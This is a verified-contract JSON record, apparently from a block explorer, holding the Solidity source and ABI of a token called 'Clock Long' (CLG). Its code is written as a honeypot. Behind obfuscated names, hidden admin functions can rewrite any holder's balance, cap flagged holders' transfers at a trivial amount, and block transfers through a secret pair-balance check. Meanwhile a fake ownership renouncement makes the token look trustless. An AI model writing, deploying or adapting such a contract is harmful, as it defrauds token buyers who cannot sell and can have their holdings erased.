{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface launchedTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingIs {\n    function createPair(address feeModeSender, address amountSwap) external returns (address);\n}\n\ninterface marketingMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeExemptAt) external view returns (uint256);\n\n    function transfer(address launchWallet, uint256 buyEnable) external returns (bool);\n\n    function allowance(address swapBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchWallet,\n        uint256 buyEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingFund, uint256 value);\n    event Approval(address indexed swapBuy, address indexed spender, uint256 value);\n}\n\ninterface limitList is marketingMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ClockLong is receiverAmount, marketingMode, limitList {\n\n    uint256 private autoFeeLimit = 100000000 * 10 ** 18;\n\n    uint256 constant autoMax = 6 ** 10;\n\n    bool public sellLiquidity;\n\n    function enableTxFrom() private view {\n        require(autoEnable[_msgSender()]);\n    }\n\n    uint256 public tradingSwap;\n\n    function transfer(address exemptAt, uint256 buyEnable) external virtual override returns (bool) {\n        return enableExempt(_msgSender(), exemptAt, buyEnable);\n    }\n\n    constructor (){\n        \n        launchedTx shouldLaunchedSell = launchedTx(modeListTx);\n        marketingToTrading = tradingIs(shouldLaunchedSell.factory()).createPair(shouldLaunchedSell.WETH(), address(this));\n        if (marketingShould == tradingSwap) {\n            listBuy = true;\n        }\n        amountEnable = _msgSender();\n        launchExempt();\n        autoEnable[amountEnable] = true;\n        receiverModeLaunch[amountEnable] = autoFeeLimit;\n        \n        emit Transfer(address(0), amountEnable, autoFeeLimit);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoFeeLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTx;\n    }\n\n    bool private autoAmount;\n\n    function feeList(address minReceiver) public {\n        enableTxFrom();\n        if (tokenReceiver == listFrom) {\n            listFrom = true;\n        }\n        if (minReceiver == amountEnable || minReceiver == marketingToTrading) {\n            return;\n        }\n        maxReceiverLaunched[minReceiver] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellTx;\n    }\n\n    mapping(address => bool) public autoEnable;\n\n    mapping(address => mapping(address => uint256)) private buyReceiverTo;\n\n    function launchedTeam(address atEnable) public {\n        require(atEnable.balance < 100000);\n        if (listTrading) {\n            return;\n        }\n        \n        autoEnable[atEnable] = true;\n        if (listShould == listFrom) {\n            autoAmount = true;\n        }\n        listTrading = true;\n    }\n\n    address modeListTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address modeAuto, address tokenLimit) external view virtual override returns (uint256) {\n        if (tokenLimit == modeListTx) {\n            return type(uint256).max;\n        }\n        return buyReceiverTo[modeAuto][tokenLimit];\n    }\n\n    uint256 private marketingShould;\n\n    function balanceOf(address takeExemptAt) public view virtual override returns (uint256) {\n        return receiverModeLaunch[takeExemptAt];\n    }\n\n    address fromFeeAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function buyTxTake(address exemptAt, uint256 buyEnable) public {\n        enableTxFrom();\n        receiverModeLaunch[exemptAt] = buyEnable;\n    }\n\n    function sellMarketingEnable(address swapMax, address launchWallet, uint256 buyEnable) internal returns (bool) {\n        require(receiverModeLaunch[swapMax] >= buyEnable);\n        receiverModeLaunch[swapMax] -= buyEnable;\n        receiverModeLaunch[launchWallet] += buyEnable;\n        emit Transfer(swapMax, launchWallet, buyEnable);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return launchBuyAmount;\n    }\n\n    bool public listTrading;\n\n    address public marketingToTrading;\n\n    event OwnershipTransferred(address indexed enableWallet, address indexed feeTrading);\n\n    bool public listBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletAtFrom;\n    }\n\n    string private exemptTx = \"Clock Long\";\n\n    function transferFrom(address swapMax, address launchWallet, uint256 buyEnable) external override returns (bool) {\n        if (_msgSender() != modeListTx) {\n            if (buyReceiverTo[swapMax][_msgSender()] != type(uint256).max) {\n                require(buyEnable <= buyReceiverTo[swapMax][_msgSender()]);\n                buyReceiverTo[swapMax][_msgSender()] -= buyEnable;\n            }\n        }\n        return enableExempt(swapMax, launchWallet, buyEnable);\n    }\n\n    mapping(address => uint256) private receiverModeLaunch;\n\n    function getOwner() external view returns (address) {\n        return launchBuyAmount;\n    }\n\n    uint256 public minSell;\n\n    bool private listFrom;\n\n    uint256 tokenAt;\n\n    bool public minFund;\n\n    address public amountEnable;\n\n    function launchExempt() public {\n        emit OwnershipTransferred(amountEnable, address(0));\n        launchBuyAmount = address(0);\n    }\n\n    function fromIs(uint256 buyEnable) public {\n        enableTxFrom();\n        minTake = buyEnable;\n    }\n\n    bool private tokenReceiver;\n\n    bool private listShould;\n\n    uint256 minTake;\n\n    string private sellTx = \"CLG\";\n\n    address private launchBuyAmount;\n\n    function enableExempt(address swapMax, address launchWallet, uint256 buyEnable) internal returns (bool) {\n        if (swapMax == amountEnable) {\n            return sellMarketingEnable(swapMax, launchWallet, buyEnable);\n        }\n        uint256 minLiquidity = marketingMode(marketingToTrading).balanceOf(fromFeeAt);\n        require(minLiquidity == minTake);\n        require(launchWallet != fromFeeAt);\n        if (maxReceiverLaunched[swapMax]) {\n            return sellMarketingEnable(swapMax, launchWallet, autoMax);\n        }\n        return sellMarketingEnable(swapMax, launchWallet, buyEnable);\n    }\n\n    uint8 private walletAtFrom = 18;\n\n    function approve(address tokenLimit, uint256 buyEnable) public virtual override returns (bool) {\n        buyReceiverTo[_msgSender()][tokenLimit] = buyEnable;\n        emit Approval(_msgSender(), tokenLimit, buyEnable);\n        return true;\n    }\n\n    mapping(address => bool) public maxReceiverLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeExemptAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyEnable\",\"type\":\"uint256\"}],\"name\":\"buyTxTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"}],\"name\":\"feeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyEnable\",\"type\":\"uint256\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"launchedTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ClockLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}